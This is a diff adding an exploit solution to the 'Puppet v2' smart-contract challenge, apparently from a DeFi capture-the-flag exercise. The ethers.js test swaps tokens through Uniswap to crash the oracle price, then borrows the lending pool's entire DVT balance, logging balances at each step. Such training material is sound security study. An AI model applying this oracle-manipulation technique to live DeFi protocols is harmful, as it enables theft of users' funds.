@@ -82,6 +82,86 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        let provider = ethers.provider
+        const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2
+
+        function formatOutput(val){
+            return parseFloat(ethers.utils.formatEther(val)).toFixed(3)
+        }
+
+        async function logData() {
+
+            let row1 = {
+                "pool DVT": formatOutput(await this.token.balanceOf(this.lendingPool.address)),
+                "pool WETH": formatOutput(await this.weth.balanceOf(this.lendingPool.address)),
+                "pool balance": formatOutput(await provider.getBalance(this.lendingPool.address)),
+                "attacker DVT": formatOutput(await this.token.balanceOf(attacker.address)),
+                "attacker WETH": formatOutput(await this.weth.balanceOf(attacker.address)),
+                "attacker balance": formatOutput(await provider.getBalance(attacker.address)),
+                "exchange DVT": formatOutput(await this.token.balanceOf(this.uniswapExchange.address)),
+                "exchange WETH": formatOutput(await this.weth.balanceOf(this.uniswapExchange.address)),
+                "exchange balance": formatOutput(await provider.getBalance(this.uniswapExchange.address))
+            };
+
+            let depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+            console.table([row1]);
+            console.log(`[+] Deposit required to borrow ${ethers.utils.formatEther(POOL_INITIAL_TOKEN_BALANCE)} DVT: ${formatOutput(depositRequired)} WETH\n`)
+        }
+        
+        console.log("0) Initial setup");
+        await logData.call(this);
+
+
+        console.log("1) swap all DVT for WETH");
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            deadline
+        )
+        await logData.call(this);
+
+
+        console.log("2) swap all ETH for DVT");
+        const ATTACKER_BALANCE = await provider.getBalance(attacker.address)
+        await this.uniswapRouter.connect(attacker).swapExactETHForTokens(
+            0,                                                          
+            [this.weth.address, this.token.address],                   
+            attacker.address,                                           
+            deadline,   
+            { value: ATTACKER_BALANCE.sub(ethers.utils.parseEther('0.1')) }
+        )
+
+        await logData.call(this);
+
+
+        console.log("3) swap all DVT for WETH");
+        const ATTACKER_TOKEN_BALANCE = await this.token.balanceOf(attacker.address)
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_TOKEN_BALANCE)
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_TOKEN_BALANCE,
+            0,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            deadline
+        )
+
+        await logData.call(this);
+
+
+        console.log("4) borrow DVT");
+        let depositRequired = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+
+        await this.weth.connect(attacker).approve(this.lendingPool.address, depositRequired)
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+
+        await logData.call(this);
+
     });
 
     after(async function () {
